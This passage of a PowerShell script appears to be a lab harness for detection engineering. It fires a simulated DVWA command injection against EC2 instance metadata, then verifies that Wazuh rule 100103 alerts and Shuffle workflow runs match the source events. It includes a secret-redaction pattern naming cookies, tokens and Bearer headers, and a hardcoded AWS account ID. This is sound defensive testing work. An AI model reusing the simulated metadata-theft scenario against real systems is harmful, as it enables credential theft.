#requires -Version 7.4
[CmdletBinding()]
param(
    [string]$SecretRoot = '',
    [string]$RuntimeRoot = '',
    [string]$ConfigurationRoot = '',
    [string]$EvidenceRoot = 'D:\terraform\aws-topology-evidence\shuffle-observe-only-g4',
    [ValidateRange(30,300)][int]$SourceTimeoutSeconds = 90,
    [ValidateRange(30,300)][int]$DetectionTimeoutSeconds = 120,
    [ValidateRange(30,300)][int]$ShuffleTimeoutSeconds = 180,
    [ValidateRange(1,10)][int]$PollSeconds = 2,
    [ValidateRange(1,5)][int]$StabilityPolls = 2,
    [ValidateRange(1,60)][int]$MaxClockSkewSeconds = 10,
    [string]$ConfirmRun = '',
    [switch]$LibraryOnly
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

$script:G4TakeIdPattern = '^capital-one-[0-9]{8}T[0-9]{6}Z-[a-f0-9]{8}$'
$script:G4UuidPattern = '^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$'
$script:G4Sha256Pattern = '^[a-f0-9]{64}$'
$script:G4ExpectedAccount = '433048100798'
$script:G4ExpectedRegion = 'ap-northeast-2'

function Throw-G4Failure {
    param([Parameter(Mandatory)][ValidateSet(
        'operation_failed','deadline','source_missing','source_duplicate','source_contract',
        'alert_missing','alert_duplicate','alert_contract','source_alert_mismatch',
        'execution_missing','execution_duplicate','execution_contract','other_rule',
        'payload_mismatch','repeat_missing','repeat_duplicate','repeat_contract',
        'clock_skew','side_effect','take_id_duplicate','evidence_unsafe'
    )][string]$Category)
    throw [InvalidOperationException]::new("g4:$Category")
}

function Invoke-G4Op {
    param(
        [Parameter(Mandatory)][hashtable]$Operations,
        [Parameter(Mandatory)][string]$Name,
        [object[]]$Arguments = @()
    )
    if (-not $Operations.ContainsKey($Name) -or $Operations[$Name] -isnot [scriptblock]) {
        Throw-G4Failure operation_failed
    }
    try { return & $Operations[$Name] @Arguments }
    catch {
        if ($_.Exception.Message -match '^g4:[a-z_]+$') { throw }
        Throw-G4Failure operation_failed
    }
}

function ConvertTo-G4OrderedValue {
    param([AllowNull()][object]$Value)
    if ($null -eq $Value -or $Value -is [string] -or $Value -is [ValueType]) { return $Value }
    if ($Value -is [Collections.IDictionary]) {
        $ordered = [ordered]@{}
        foreach ($key in @($Value.Keys | ForEach-Object { [string]$_ } | Sort-Object -CaseSensitive)) {
            $ordered[$key] = ConvertTo-G4OrderedValue -Value $Value[$key]
        }
        return $ordered
    }
    if ($Value -is [Collections.IEnumerable]) {
        return @($Value | ForEach-Object { ConvertTo-G4OrderedValue -Value $_ })
    }
    $properties = @($Value.PSObject.Properties | Where-Object {
        $_.MemberType -in @('NoteProperty','Property','AliasProperty','ScriptProperty')
    } | Sort-Object Name -CaseSensitive)
    $object = [ordered]@{}
    foreach ($property in $properties) {
        $object[$property.Name] = ConvertTo-G4OrderedValue -Value $property.Value
    }
    return $object
}

function ConvertTo-G4CanonicalJson {
    param([Parameter(Mandatory)][object]$Value)
    return (ConvertTo-G4OrderedValue -Value $Value | ConvertTo-Json -Depth 100 -Compress)
}

function Get-G4Sha256 {
    param([Parameter(Mandatory)][string]$Text)
    $bytes = [Text.Encoding]::UTF8.GetBytes($Text)
    try { return [Convert]::ToHexString([Security.Cryptography.SHA256]::HashData($bytes)).ToLowerInvariant() }
    finally { [Array]::Clear($bytes,0,$bytes.Length) }
}

function Test-G4SemanticEqual {
    param([Parameter(Mandatory)][object]$Left,[Parameter(Mandatory)][object]$Right)
    return (ConvertTo-G4CanonicalJson $Left) -ceq (ConvertTo-G4CanonicalJson $Right)
}

function ConvertFrom-G4JsonOnce {
    param([AllowNull()][object]$Value)
    if ($Value -isnot [string]) {
        if ($null -eq $Value) { Throw-G4Failure execution_contract }
        return $Value
    }
    $text = ([string]$Value).Trim()
    if ($text.Length -eq 0 -or $text.Length -gt 1048576 -or
        (-not $text.StartsWith('{') -and -not $text.StartsWith('['))) {
        Throw-G4Failure execution_contract
    }
    try { $decoded = $text | ConvertFrom-Json -Depth 100 -DateKind String }
    catch { Throw-G4Failure execution_contract }
    if ($decoded -is [string]) { Throw-G4Failure execution_contract }
    return $decoded
}

function Get-G4Utc {
    param([Parameter(Mandatory)][object]$Value)
    try {
        if ($Value -is [datetimeoffset]) {
            $parsed = [datetimeoffset]$Value
        } elseif ($Value -is [datetime]) {
            if ([datetime]$Value.Kind -ne [DateTimeKind]::Utc) { Throw-G4Failure clock_skew }
            $parsed = [datetimeoffset]::new([datetime]$Value)
        } else {
            $parsed = [datetimeoffset]::Parse(
                [string]$Value,[Globalization.CultureInfo]::InvariantCulture,
                [Globalization.DateTimeStyles]::RoundtripKind
            )
        }
    } catch {
        if ($_.Exception.Message -ceq 'g4:clock_skew') { throw }
        Throw-G4Failure clock_skew
    }
    if ($parsed.Offset -ne [timespan]::Zero) { Throw-G4Failure clock_skew }
    return $parsed.ToUniversalTime()
}

function Get-G4Property {
    param([AllowNull()][object]$Object,[Parameter(Mandatory)][string]$Name)
    if ($null -eq $Object) { return $null }
    if ($Object -is [Collections.IDictionary]) { return $Object[$Name] }
    $property = $Object.PSObject.Properties[$Name]
    if ($null -eq $property) { return $null }
    return $property.Value
}

function Assert-G4Workflow {
    param(
        [Parameter(Mandatory)][object]$Workflow,
        [Parameter(Mandatory)][string]$WorkflowId,
        [Parameter(Mandatory)][string]$WebhookId
    )
    if ($WorkflowId -cnotmatch $script:G4UuidPattern -or $WebhookId -cnotmatch $script:G4UuidPattern -or
        [string]$Workflow.id -cne $WorkflowId -or [string]$Workflow.sharing -cne 'private' -or
        [bool]$Workflow.is_valid -ne $true) { Throw-G4Failure execution_contract }
    $triggers = @($Workflow.triggers)
    $actions = @($Workflow.actions)
    $branches = @($Workflow.branches)
    if ($triggers.Count -ne 1 -or $actions.Count -ne 1 -or $branches.Count -ne 1) {
        Throw-G4Failure side_effect
    }
    $trigger = $triggers[0]
    $action = $actions[0]
    $triggerType = if ($null -ne $trigger.PSObject.Properties['trigger_type']) {
        [string]$trigger.trigger_type
    } else { [string]$trigger.type }
    if ([string]$trigger.id -cne $WebhookId -or $triggerType.ToLowerInvariant() -cne 'webhook' -or
        ([string]$trigger.status -and ([string]$trigger.status).ToLowerInvariant() -notin @('running','active')) -or
        [string]$action.app_name -cne 'Shuffle Tools' -or [string]$action.name -cne 'repeat_back_to_me' -or
        [string]::IsNullOrWhiteSpace([string]$action.id) -or [string]::IsNullOrWhiteSpace([string]$action.label)) {
        Throw-G4Failure side_effect
    }
    $parameters = @($action.parameters | Where-Object { [string]$_.name -ceq 'call' })
    if ($parameters.Count -ne 1 -or [string]$parameters[0].value -cne '$exec') { Throw-G4Failure side_effect }
    $branch = $branches[0]
    $sourceId = if ($null -ne $branch.PSObject.Properties['source_id']) { [string]$branch.source_id } else { [string]$branch.source }
    $destinationId = if ($null -ne $branch.PSObject.Properties['destination_id']) { [string]$branch.destination_id } else { [string]$branch.destination }
    $conditions = @($branch.conditions)
    if ($sourceId -cne [string]$trigger.id -or $destinationId -cne [string]$action.id -or
        ($null -ne $branch.PSObject.Properties['conditions'] -and $conditions.Count -ne 0)) {
        Throw-G4Failure side_effect
    }
    return [pscustomobject]@{ TriggerId=[string]$trigger.id;ActionId=[string]$action.id;ActionLabel=[string]$action.label }
}

function Get-G4ValidatedSourceEvents {
    param([Parameter(Mandatory)][object[]]$Events,[Parameter(Mandatory)][string]$TakeId)
    $ids = [Collections.Generic.HashSet[string]]::new([StringComparer]::Ordinal)
    $records = [Collections.Generic.List[object]]::new()
    foreach ($event in $Events) {
        $eventId = [string](Get-G4Property $event 'event_id')
        $rawHash = [string](Get-G4Property $event 'raw_message_sha256')
        if (-not $ids.Add($eventId)) { Throw-G4Failure source_duplicate }
        if ($eventId -cnotmatch '^cwl:433048100798:[\x21-\x7e]{20,480}$' -or
            $rawHash -cnotmatch $script:G4Sha256Pattern -or
            [string](Get-G4Property $event 'take_id') -cne $TakeId -or
            [string](Get-G4Property $event 'source') -cne 'dvwa' -or
            [string](Get-G4Property $event 'transport') -cne 'push' -or
            [string](Get-G4Property $event 'aws_account_id') -cne $script:G4ExpectedAccount -or
            [string](Get-G4Property $event 'aws_region') -cne $script:G4ExpectedRegion -or
            [bool](Get-G4Property $event 'normalized') -ne $true -or
            [string](Get-G4Property $event 'event_type') -cne 'command.execution' -or
            [string](Get-G4Property $event 'result') -cne 'succeeded' -or
            [string](Get-G4Property $event 'route') -cne '/vulnerabilities/exec/' -or
            [string](Get-G4Property $event 'action') -cne 'shell_command' -or
            [string](Get-G4Property $event 'security_level') -cne 'low' -or
            [string](Get-G4Property $event 'resource') -cne 'ec2_imds') {
            Throw-G4Failure source_contract
        }
        $records.Add([pscustomobject]@{
            event_id=$eventId;raw_message_sha256=$rawHash
            event_time_utc=[string](Get-G4Property $event 'event_time_utc')
            bridge_received_at_utc=[string](Get-G4Property $event 'bridge_received_at_utc')
        })
    }
    return @($records)
}

function Get-G4AlertRecord {
    param([Parameter(Mandatory)][object]$Hit,[Parameter(Mandatory)][string]$TakeId)
    $source = Get-G4Property $Hit '_source'
    $rule = Get-G4Property $source 'rule'
    $data = Get-G4Property $source 'data'
    $payload = Get-G4Property $data 'payload'
    $context = Get-G4Property $payload 'context'
    $alertId = [string](Get-G4Property $source 'id')
    $eventId = [string](Get-G4Property $data 'event_id')
    $rawHash = [string](Get-G4Property $data 'raw_message_sha256')
    if ([string](Get-G4Property $rule 'id') -cne '100103') { Throw-G4Failure other_rule }
    if ([int](Get-G4Property $rule 'level') -ne 10 -or
        [string](Get-G4Property $data 'source') -cne 'dvwa' -or
        [string](Get-G4Property $data 'transport') -cne 'push' -or
        [string](Get-G4Property $data 'aws_account_id') -cne $script:G4ExpectedAccount -or
        [string](Get-G4Property $data 'aws_region') -cne $script:G4ExpectedRegion -or
        ([string](Get-G4Property $payload 'normalized') -cne 'true' -and
            [bool](Get-G4Property $payload 'normalized') -ne $true) -or
        [string](Get-G4Property $payload 'take_id') -cne $TakeId -or
        [string](Get-G4Property $payload 'event_type') -cne 'command.execution' -or
        [string](Get-G4Property $payload 'result') -cne 'succeeded' -or
        [string](Get-G4Property $payload 'route') -cne '/vulnerabilities/exec/' -or
        [string](Get-G4Property $context 'action') -cne 'shell_command' -or
        [string](Get-G4Property $context 'resource') -cne 'ec2_imds' -or
        [string](Get-G4Property $context 'security_level') -cne 'low' -or
        $eventId -cnotmatch '^cwl:433048100798:[\x21-\x7e]{20,480}$' -or
        $alertId -cnotmatch '^[0-9]+\.[0-9]+$' -or $rawHash -cnotmatch $script:G4Sha256Pattern) {
        Throw-G4Failure alert_contract
    }
    return [pscustomobject]@{
        Hit=$Hit;event_id=$eventId;wazuh_alert_id=$alertId;raw_message_sha256=$rawHash
        event_time_utc=[string](Get-G4Property $data 'event_time')
        alert_time_utc=[string](Get-G4Property $source 'timestamp')
    }
}

function New-G4ExpectedBody {
    param([Parameter(Mandatory)][object]$AlertRecord,[Parameter(Mandatory)][object]$SentAtUtc)
    $sent = Get-G4Utc $SentAtUtc
    $event = Get-G4Utc $AlertRecord.event_time_utc
    $alertPayload = Get-G4Property (Get-G4Property (Get-G4Property $AlertRecord.Hit '_source') 'data') 'payload'
    $body = [ordered]@{
        schema_version=1;source_system='wazuh';sent_at_utc=$sent.ToString('yyyy-MM-ddTHH:mm:ss.fffZ')
        account_alias='primary-lab';aws_account_id=$script:G4ExpectedAccount;aws_region=$script:G4ExpectedRegion
        scenario_id='CAPITAL-ONE';rule=[ordered]@{id='100103';level=10}
        incident=[ordered]@{
            take_id=[string](Get-G4Property $alertPayload 'take_id')
            event_id=[string]$AlertRecord.event_id;wazuh_alert_id=[string]$AlertRecord.wazuh_alert_id
            event_time_utc=$event.ToString('yyyy-MM-ddTHH:mm:ss.fffZ');result='succeeded';route='/vulnerabilities/exec/'
        }
        integrity=[ordered]@{raw_message_sha256=[string]$AlertRecord.raw_message_sha256}
    }
    $bodyHash = Get-G4Sha256 (ConvertTo-G4CanonicalJson $body)
    $body.integrity.body_sha256 = $bodyHash
    return $body
}

function Get-G4RepeatObservation {
    param([Parameter(Mandatory)][object]$Result,[Parameter(Mandatory)][object]$WorkflowContract)
    if ([string](Get-G4Property $Result 'execution_id') -cnotmatch $script:G4UuidPattern) {
        Throw-G4Failure execution_contract
    }
    $repeat = [Collections.Generic.List[object]]::new()
    foreach ($entry in @($Result.results)) {
        $actionObject = Get-G4Property $entry 'action'
        $actionId = if ($actionObject -is [string]) { [string]$actionObject } else { [string](Get-G4Property $actionObject 'id') }
        if (-not $actionId) { $actionId = [string](Get-G4Property $entry 'action_id') }
        $label = [string](Get-G4Property $actionObject 'label')
        if (-not $label) { $label = [string](Get-G4Property $entry 'label') }
        if ($actionId -ceq [string]$WorkflowContract.TriggerId) { continue }
        if ($actionId -cne [string]$WorkflowContract.ActionId) { Throw-G4Failure side_effect }
        if ($label -and $label -cne [string]$WorkflowContract.ActionLabel) { Throw-G4Failure repeat_contract }
        $repeat.Add($entry)
    }
    if ($repeat.Count -eq 0) { return [pscustomobject]@{Ready=$false;Value=$null} }
    if ($repeat.Count -ne 1) { Throw-G4Failure repeat_duplicate }
    $item = $repeat[0]
    $status=[string](Get-G4Property $item 'status')
    $value=Get-G4Property $item 'result'
    if ($status -in @('','EXECUTING','RUNNING','PENDING','WAITING') -or $null -eq $value -or
        ($value -is [string] -and [string]::IsNullOrWhiteSpace([string]$value))) {
        return [pscustomobject]@{Ready=$false;Value=$null}
    }
    if ($status -cne 'SUCCESS') { Throw-G4Failure repeat_contract }
    return [pscustomobject]@{Ready=$true;Value=(ConvertFrom-G4JsonOnce $value)}
}

function Wait-G4StableCollection {
    param(
        [Parameter(Mandatory)][hashtable]$Operations,[Parameter(Mandatory)][string]$Operation,
        [Parameter(Mandatory)][datetimeoffset]$Deadline,[int]$ExpectedCount = -1,
        [Parameter(Mandatory)][int]$StabilityPolls,[Parameter(Mandatory)][int]$PollSeconds,
        [Parameter(Mandatory)][ValidateSet('source','alert','execution')][string]$Kind,
        [object[]]$Arguments=@()
    )
    $stable = 0;$previous = '';$last = @()
    while ([datetimeoffset](Invoke-G4Op $Operations 'Now') -lt $Deadline) {
        $last = @(Invoke-G4Op $Operations $Operation $Arguments)
        if ($ExpectedCount -ge 0 -and $last.Count -gt $ExpectedCount) {
            $category = if ($Kind -ceq 'alert') {'alert_duplicate'} elseif ($Kind -ceq 'execution') {'execution_duplicate'} else {'source_duplicate'}
            Throw-G4Failure $category
        }
        $fingerprint = @($last | ForEach-Object { ConvertTo-G4CanonicalJson $_ } | Sort-Object) -join "`n"
        if ($fingerprint -ceq $previous -and $last.Count -gt 0 -and
            ($ExpectedCount -lt 0 -or $last.Count -eq $ExpectedCount)) { $stable++ } else { $stable=0;$previous=$fingerprint }
        if ($stable -ge $StabilityPolls) { return @($last) }
        Invoke-G4Op $Operations 'Sleep' @($PollSeconds) | Out-Null
    }
    if ($last.Count -eq 0 -or ($ExpectedCount -ge 0 -and $last.Count -lt $ExpectedCount)) {
        $category = if ($Kind -ceq 'source') {'source_missing'} elseif ($Kind -ceq 'alert') {'alert_missing'} else {'execution_missing'}
        Throw-G4Failure $category
    }
    Throw-G4Failure deadline
}

function Invoke-G4Phase {
    param(
        [Parameter(Mandatory)][string]$Phase,[Parameter(Mandatory)][string]$TakeId,
        [Parameter(Mandatory)][hashtable]$Operations,[Parameter(Mandatory)][object]$WorkflowContract,
        [Parameter(Mandatory)][int]$SourceTimeoutSeconds,[Parameter(Mandatory)][int]$DetectionTimeoutSeconds,
        [Parameter(Mandatory)][int]$ShuffleTimeoutSeconds,[Parameter(Mandatory)][int]$PollSeconds,
        [Parameter(Mandatory)][int]$StabilityPolls,[Parameter(Mandatory)][int]$MaxClockSkewSeconds
    )
    if ($TakeId -cnotmatch $script:G4TakeIdPattern) { Throw-G4Failure source_contract }
    $started = [datetimeoffset](Invoke-G4Op $Operations 'Now')
    $baseline = @(Invoke-G4Op $Operations 'GetExecutions')
    if ($baseline.Count -ge 100) { Throw-G4Failure execution_contract }
    $baselineIds = [Collections.Generic.HashSet[string]]::new([StringComparer]::Ordinal)
    foreach ($execution in $baseline) { [void]$baselineIds.Add([string](Get-G4Property $execution 'execution_id')) }

    Invoke-G4Op $Operations 'InvokeEvent' @($TakeId) | Out-Null
    $sources = @(Wait-G4StableCollection -Operations $Operations -Operation 'GetSourceEvents' `
        -Arguments @($TakeId) -Deadline $started.AddSeconds($SourceTimeoutSeconds) -ExpectedCount -1 `
        -StabilityPolls $StabilityPolls -PollSeconds $PollSeconds -Kind source)
    $sources = @(Get-G4ValidatedSourceEvents -Events $sources -TakeId $TakeId)
    $expectedCount = $sources.Count
    if ($expectedCount -lt 1) { Throw-G4Failure source_missing }
    if ($expectedCount -gt 20) { Throw-G4Failure alert_contract }

    $hits = @(Wait-G4StableCollection -Operations $Operations -Operation 'GetAlerts' `
        -Arguments @($TakeId) -Deadline ([datetimeoffset](Invoke-G4Op $Operations 'Now')).AddSeconds($DetectionTimeoutSeconds) `
        -ExpectedCount $expectedCount -StabilityPolls $StabilityPolls -PollSeconds $PollSeconds -Kind alert)
    $alerts = [Collections.Generic.List[object]]::new()
    $alertIds = [Collections.Generic.HashSet[string]]::new([StringComparer]::Ordinal)
    $alertEvents = [Collections.Generic.HashSet[string]]::new([StringComparer]::Ordinal)
    foreach ($hit in $hits) {
        $record = Get-G4AlertRecord -Hit $hit -TakeId $TakeId
        if (-not $alertIds.Add([string]$record.wazuh_alert_id) -or -not $alertEvents.Add([string]$record.event_id)) {
            Throw-G4Failure alert_duplicate
        }
        $alerts.Add($record)
    }
    $sourceIds = @($sources.event_id | Sort-Object)
    $detectedIds = @($alerts.event_id | Sort-Object)
    if (@(Compare-Object $sourceIds $detectedIds).Count -ne 0) { Throw-G4Failure source_alert_mismatch }
    foreach ($source in $sources) {
        $alert = @($alerts | Where-Object { $_.event_id -ceq $source.event_id })[0]
        if ([string]$alert.raw_message_sha256 -cne [string]$source.raw_message_sha256) { Throw-G4Failure source_alert_mismatch }
    }

    $executionDeadline = ([datetimeoffset](Invoke-G4Op $Operations 'Now')).AddSeconds($ShuffleTimeoutSeconds)
    $newExecutions = @()
    do {
        $all = @(Invoke-G4Op $Operations 'GetExecutions')
        if ($all.Count -ge 100) { Throw-G4Failure execution_contract }
        $newExecutions = @($all | Where-Object { -not $baselineIds.Contains([string](Get-G4Property $_ 'execution_id')) })
        $newIds = @($newExecutions | ForEach-Object { [string](Get-G4Property $_ 'execution_id') })
        if (@($newIds | Sort-Object -Unique).Count -ne $newIds.Count -or $newExecutions.Count -gt $expectedCount) {
            Throw-G4Failure execution_duplicate
        }
        $finished = @($newExecutions | Where-Object { [string](Get-G4Property $_ 'status') -ceq 'FINISHED' })
        if ($newExecutions.Count -eq $expectedCount -and $finished.Count -eq $expectedCount) { break }
        Invoke-G4Op $Operations 'Sleep' @($PollSeconds) | Out-Null
    } while ([datetimeoffset](Invoke-G4Op $Operations 'Now') -lt $executionDeadline)
    if ($newExecutions.Count -lt $expectedCount) { Throw-G4Failure execution_missing }
    if (@($newExecutions | Where-Object { [string](Get-G4Property $_ 'status') -cne 'FINISHED' }).Count -ne 0) { Throw-G4Failure deadline }

    $resultDeadline=([datetimeoffset](Invoke-G4Op $Operations 'Now')).AddSeconds($ShuffleTimeoutSeconds)
    $byEvent = @{};$records = [Collections.Generic.List[object]]::new()
    foreach ($execution in $newExecutions) {
        $executionId = [string](Get-G4Property $execution 'execution_id')
        if ($executionId -cnotmatch $script:G4UuidPattern) { Throw-G4Failure execution_contract }
        $result=$null;$repeatObservation=$null
        while ([datetimeoffset](Invoke-G4Op $Operations 'Now') -lt $resultDeadline) {
            $result=Invoke-G4Op $Operations 'GetExecutionResult' @($execution)
            if ([string](Get-G4Property $result 'execution_id') -cne $executionId) { Throw-G4Failure execution_contract }
            $repeatObservation=Get-G4RepeatObservation -Result $result -WorkflowContract $WorkflowContract
            if ([bool]$repeatObservation.Ready) { break }
            Invoke-G4Op $Operations 'Sleep' @($PollSeconds) | Out-Null
        }
        if ($null -eq $repeatObservation -or -not [bool]$repeatObservation.Ready) { Throw-G4Failure repeat_missing }
        $argumentValue=Get-G4Property $result 'execution_argument'
        if ($null -eq $argumentValue) { $argumentValue=Get-G4Property $execution 'execution_argument' }
        $argument = ConvertFrom-G4JsonOnce $argumentValue
        if ([string](Get-G4Property (Get-G4Property $argument 'rule') 'id') -cne '100103') { Throw-G4Failure other_rule }
        $eventId = [string](Get-G4Property (Get-G4Property $argument 'incident') 'event_id')
        if (-not $eventId -or $byEvent.ContainsKey($eventId)) { Throw-G4Failure execution_duplicate }
        $alert = @($alerts | Where-Object { $_.event_id -ceq $eventId })
        if ($alert.Count -ne 1) { Throw-G4Failure execution_contract }
        $expected = New-G4ExpectedBody -AlertRecord $alert[0] -SentAtUtc (Get-G4Property $argument 'sent_at_utc')
        if (-not (Test-G4SemanticEqual $expected $argument)) { Throw-G4Failure payload_mismatch }
        $repeat = $repeatObservation.Value
        if (-not (Test-G4SemanticEqual $argument $repeat)) { Throw-G4Failure payload_mismatch }
        $now = [datetimeoffset](Invoke-G4Op $Operations 'Now')
        $eventTime = Get-G4Utc $alert[0].event_time_utc
        $alertTime = Get-G4Utc $alert[0].alert_time_utc
        $executionTime = Get-G4Utc (Get-G4Property $execution 'started_at')
        $bridgeTime = Get-G4Utc (@($sources | Where-Object { $_.event_id -ceq $eventId })[0].bridge_received_at_utc)
        $minimum = $started.AddSeconds(-$MaxClockSkewSeconds);$maximum=$now.AddSeconds($MaxClockSkewSeconds)
        foreach ($time in @($eventTime,$bridgeTime,$alertTime,$executionTime)) {
            if ($time -lt $minimum -or $time -gt $maximum) { Throw-G4Failure clock_skew }
        }
        if ($bridgeTime -lt $eventTime.AddSeconds(-$MaxClockSkewSeconds) -or
            $alertTime -lt $eventTime.AddSeconds(-$MaxClockSkewSeconds) -or
            $executionTime -lt $alertTime.AddSeconds(-$MaxClockSkewSeconds)) { Throw-G4Failure clock_skew }
        $latency = [math]::Round(($executionTime-$alertTime).TotalSeconds,3)
        $bodySha = [string](Get-G4Property (Get-G4Property $argument 'integrity') 'body_sha256')
        if ($bodySha -cnotmatch $script:G4Sha256Pattern) { Throw-G4Failure payload_mismatch }
        $record = [ordered]@{
            take_id=$TakeId;event_id=$eventId;wazuh_alert_id=[string]$alert[0].wazuh_alert_id
            raw_message_sha256=[string]$alert[0].raw_message_sha256;body_sha256=$bodySha
            shuffle_execution_id=$executionId;alert_timestamp_utc=$alertTime.ToString('o')
            execution_timestamp_utc=$executionTime.ToString('o');latency_seconds=$latency
        }
        $byEvent[$eventId]=$record;$records.Add([pscustomobject]$record)
    }
    if ($byEvent.Count -ne $expectedCount -or
        @(Compare-Object @($byEvent.Keys | Sort-Object) $sourceIds).Count -ne 0) { Throw-G4Failure execution_missing }

    $observedExecutionIds=@($newExecutions|ForEach-Object{[string](Get-G4Property $_ 'execution_id')}|Sort-Object)
    $stabilityDeadline=([datetimeoffset](Invoke-G4Op $Operations 'Now')).AddSeconds($ShuffleTimeoutSeconds)
    $stable=0
    while ([datetimeoffset](Invoke-G4Op $Operations 'Now') -lt $stabilityDeadline) {
        $all=@(Invoke-G4Op $Operations 'GetExecutions')
        if ($all.Count -ge 100) { Throw-G4Failure execution_contract }
        $currentIds=@($all|Where-Object{-not $baselineIds.Contains([string](Get-G4Property $_ 'execution_id'))}|ForEach-Object{
            [string](Get-G4Property $_ 'execution_id')
        }|Sort-Object)
        if (@($currentIds|Sort-Object -Unique).Count -ne $currentIds.Count -or $currentIds.Count -gt $expectedCount) {
            Throw-G4Failure execution_duplicate
        }
        if (@(Compare-Object $observedExecutionIds $currentIds).Count -eq 0) { $stable++ } else { $stable=0 }
        if ($stable -ge $StabilityPolls) { break }
        Invoke-G4Op $Operations 'Sleep' @($PollSeconds)|Out-Null
    }
    if ($stable -lt $StabilityPolls) { Throw-G4Failure execution_missing }
    $completed = [datetimeoffset](Invoke-G4Op $Operations 'Now')
    return [ordered]@{
        schema_version=1;gate='G4';phase=$Phase;take_id=$TakeId;status='PASS'
        started_at_utc=$started.ToString('o');completed_at_utc=$completed.ToString('o')
        actual_request_count=1;runtime_source_event_count=$expectedCount;rule_100103_alert_count=$alerts.Count
        shuffle_execution_count=$newExecutions.Count;repeat_success_count=$records.Count
        missing_count=0;duplicate_count=0;other_rule_count=0;payload_mismatch_count=0
        external_side_effect_count=0;clock_skew_checked=$true;clock_skew_within_limit=$true
        source_alert_execution_bijection=$true;events=@($records)
        secret_exposure_count=0;cookie_persisted=$false;command_persisted=$false;full_log_persisted=$false;token_persisted=$false
    }
}

function Test-G4EvidenceSafety {
    param([Parameter(Mandatory)][object]$Evidence)
    $json = $Evidence | ConvertTo-Json -Depth 100 -Compress
    if ($json -match '(?i)"(cookie|command|full_log|token|authorization|execution_argument|repeat_result|request_payload|api_key|webhook_uri|webhook_url|header_value)"\s*:' -or
        $json -match '(?i)X-SOC-Webhook-Key|Bearer\s+[A-Za-z0-9._~+/-]+') { Throw-G4Failure evidence_unsafe }
}

function Invoke-SocRule100103DynamicCore {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)][hashtable]$Operations,[Parameter(Mandatory)][object]$WorkflowContract,
        [ValidateRange(1,300)][int]$SourceTimeoutSeconds=90,[ValidateRange(1,300)][int]$DetectionTimeoutSeconds=120,
        [ValidateRange(1,300)][int]$ShuffleTimeoutSeconds=180,[ValidateRange(1,10)][int]$PollSeconds=2,
        [ValidateRange(1,5)][int]$StabilityPolls=2,[ValidateRange(1,60)][int]$MaxClockSkewSeconds=10
    )
    $phaseNames=@('PILOT','TAKE-1','TAKE-2','TAKE-3')
    $used=[Collections.Generic.HashSet[string]]::new([StringComparer]::Ordinal)
    $completed=[Collections.Generic.List[object]]::new()
    foreach ($phase in $phaseNames) {
        $takeId=[string](Invoke-G4Op $Operations 'NewTakeId' @($phase))
        if (-not $used.Add($takeId)) { Throw-G4Failure take_id_duplicate }
        try {
            $record=Invoke-G4Phase -Phase $phase -TakeId $takeId -Operations $Operations `
                -WorkflowContract $WorkflowContract -SourceTimeoutSeconds $SourceTimeoutSeconds `
                -DetectionTimeoutSeconds $DetectionTimeoutSeconds -ShuffleTimeoutSeconds $ShuffleTimeoutSeconds `
                -PollSeconds $PollSeconds -StabilityPolls $StabilityPolls -MaxClockSkewSeconds $MaxClockSkewSeconds
            Test-G4EvidenceSafety $record
            Invoke-G4Op $Operations 'WritePhase' @($phase,$record) | Out-Null
            $completed.Add([pscustomobject]$record)
            $manifest=[ordered]@{
                schema_version=1;gate='G4';status='RUNNING';pilot_completed=(@($completed|Where-Object phase -ceq 'PILOT').Count -eq 1)
                take_completed_count=@($completed|Where-Object phase -like 'TAKE-*').Count
                take_verdicts=@($completed|Where-Object phase -like 'TAKE-*'|ForEach-Object {[ordered]@{phase=$_.phase;take_id=$_.take_id;status=$_.status}})
                pilot_excluded_from_take_verdict=$true;external_side_effect_count=0;secret_exposure_count=0
            }
            Test-G4EvidenceSafety $manifest
            Invoke-G4Op $Operations 'WriteManifest' @($manifest) | Out-Null
        } catch {
            $category=if ($_.Exception.Message -match '^g4:([a-z_]+)$') {$Matches[1]} else {'operation_failed'}
            $failure=[ordered]@{
                schema_version=1;gate='G4';phase=$phase;take_id=$takeId;status='FAIL';failure_category=$category
                stopped_after_first_failure=$true;external_side_effect_count=0;secret_exposure_count=0
                cookie_persisted=$false;command_persisted=$false;full_log_persisted=$false;token_persisted=$false
            }
            Test-G4EvidenceSafety $failure
            try { Invoke-G4Op $Operations 'WritePhase' @($phase,$failure) | Out-Null } catch {}
            try { Invoke-G4Op $Operations 'WriteManifest' @([ordered]@{
                schema_version=1;gate='G4';status='FAIL';failed_phase=$phase;failure_category=$category
                pilot_excluded_from_take_verdict=$true;take_completed_count=@($completed|Where-Object phase -like 'TAKE-*').Count
                external_side_effect_count=0;secret_exposure_count=0
            }) | Out-Null } catch {}
            throw [InvalidOperationException]::new("g4:$category")
        }
    }
    $takes=@($completed|Where-Object phase -like 'TAKE-*')
    $final=[ordered]@{
        schema_version=1;gate='G4';status='PASS';pilot_status='PASS';pilot_excluded_from_take_verdict=$true
        take_completed_count=$takes.Count;take_verdict='PASS';unique_take_count=$used.Count
        runtime_source_event_count=[int](($takes|Measure-Object runtime_source_event_count -Sum).Sum)
        rule_100103_alert_count=[int](($takes|Measure-Object rule_100103_alert_count -Sum).Sum)
        shuffle_execution_count=[int](($takes|Measure-Object shuffle_execution_count -Sum).Sum)
        repeat_success_count=[int](($takes|Measure-Object repeat_success_count -Sum).Sum)
        missing_count=0;duplicate_count=0;other_rule_count=0;payload_mismatch_count=0
        external_side_effect_count=0;clock_skew_checked=$true;secret_exposure_count=0
        takes=@($takes|ForEach-Object {[ordered]@{phase=$_.phase;take_id=$_.take_id;status=$_.status;runtime_count=$_.runtime_source_event_count}})
    }
    Test-G4EvidenceSafety $final
    Invoke-G4Op $Operations 'WriteManifest' @($final) | Out-Null
    return [pscustomobject]$final
}

function Write-G4AtomicJson {
    param([Parameter(Mandatory)][string]$Path,[Parameter(Mandatory)][object]$Value,[switch]$NoReplace)
    Test-G4EvidenceSafety $Value
    if ($NoReplace -and (Test-Path -LiteralPath $Path)) { Throw-G4Failure evidence_unsafe }
    $temporary="$Path.$([guid]::NewGuid().ToString('N')).tmp"
    $backup="$Path.$([guid]::NewGuid().ToString('N')).bak"
    try {
        [IO.File]::WriteAllText($temporary,(($Value|ConvertTo-Json -Depth 100)+"`n"),[Text.UTF8Encoding]::new($false))
